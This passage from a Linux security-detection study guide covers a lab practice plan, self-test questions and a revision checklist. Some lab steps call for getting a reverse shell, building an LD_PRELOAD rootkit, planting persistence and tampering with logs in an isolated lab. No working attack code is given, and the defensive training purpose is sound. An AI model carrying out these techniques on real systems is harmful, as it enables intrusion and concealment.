- **Egress control** and DNS filtering.
- **Incident readiness:** documented live-response steps, trusted tooling, memory capture capability.

---

## 15. Lab practice plan

1. Build an Ubuntu and a Rocky/CentOS VM; enable auditd, Sysmon for Linux, and a SIEM agent.
2. Generate SSH failures and successes; write/tune detection rules.
3. Spin up a vulnerable web app (isolated); get a reverse shell; capture process/network evidence.
4. Simulate privesc via SUID and sudo misconfig; detect with `find`, `sudo -l`, audit.
5. Add cron/systemd/authorized_keys persistence; detect and remove.
6. Create an LD_PRELOAD rootkit in a lab; compare `ps` vs `/proc`.
7. Simulate cryptomining with a harmless CPU burner + fake pool domain; detect.
8. Test log tampering (lab); verify remote logging still captures it.
9. Run a privileged container with a host mount; observe escape risk; apply hardening.
10. Write an incident report from §10/§11 with timeline and evidence.

---

## 16. Self-test questions

1. What does PID 1 do, and why does it matter?
2. How do you find the real executable of a running process?
3. What does `/proc/<pid>/exe -> ... (deleted)` indicate?
4. What is the difference between `/etc/passwd` and `/etc/shadow`?
5. How would you find a UID 0 account that isn't root?
6. What are the main SSH log sources, and what do they contain?
7. Name six Linux persistence mechanisms.
8. How would you detect a reverse shell in process telemetry?
9. What is GTFOBins, and how is it relevant to sudo?
10. How do capabilities differ from SUID?
11. What are indicators of a rootkit?
12. How would you detect log tampering?
13. What is the volatile-data collection order?
14. Why is `rkhunter` output not proof of compromise?
15. What container configurations enable host escape?

---

## 17. One-page revision checklist

- [ ] Architecture: kernel, systemd, userland, PAM, logging, cgroups/namespaces.
- [ ] Boot: UEFI/GRUB/initramfs; targets; unit locations.
- [ ] Processes: fork/exec, PID 1, zombies/orphans, signals, `/proc` (`cmdline`, `exe`, `cwd`, `environ`, `fd`, `maps`).
- [ ] Users/auth: passwd/shadow/group, UID 0, PAM, sudo/sudoers, SSH keys/agent forwarding, `sshd_config`.
- [ ] Logs: auth.log/secure, syslog/messages, kern, cron, audit.log, wtmp/btmp/lastlog, journald, web/package logs.
- [ ] auditd: rules, SYSCALL/EXECVE/PATH/USER_AUTH, ausearch/aureport.
- [ ] Persistence: cron, systemd service/timer, rc.local, profiles, authorized_keys, sudoers, PAM, LD_PRELOAD, modules, udev, at, containers, motd.
- [ ] Attacks: SSH brute/stuffing, web RCE/reverse shell, privesc (SUID/caps/sudo/cron/PATH/LD_PRELOAD/kernel/NFS/docker/lxd/polkit), cryptomining, ransomware, rootkits, log tampering, containers.
- [ ] Execution patterns: download-and-run, temp execution, base64, deleted binaries, masquerading, reverse shells, staging.
- [ ] Telemetry: auth, auditd, Sysmon for Linux, EDR, osquery, Falco, Wazuh/AIDE, web/package/cloud logs.
- [ ] Detections: SSH failures→success, new users, sudo, reverse shells, download-exec, temp exec, web-server children, persistence writes, LD_PRELOAD, modules, service stops, log tampering, history clearing, SUID/caps, miners, outbound from services, staging, rootkit signals, container escapes, tunnels, package abuse, account changes.
- [ ] Investigation: volatile order → timeline → actor → privilege/persistence → network → files/integrity → scope → respond → document.
- [ ] Triage: SSH brute, reverse shell, web shell, privesc, persistence, miner, rootkit/log tampering, container escape, exfil.
- [ ] Commands: `ps`/`pstree`, `/proc`, `ss`/`lsof`, `getent`, `sudo -l`, `crontab`, `systemctl`, `find -perm`, `getcap`, `journalctl`, `ausearch`, `rpm -Va`/`debsums`, `aide`, `rkhunter`, `sha256sum`, `tcpdump`.
- [ ] Hardening: SSH hardening, least privilege, patching, SELinux/AppArmor, auditd, persistent/remote logging, FIM/EDR, disable unused, container hardening, secrets, backups, sysctl, MFA, egress, IR readiness.
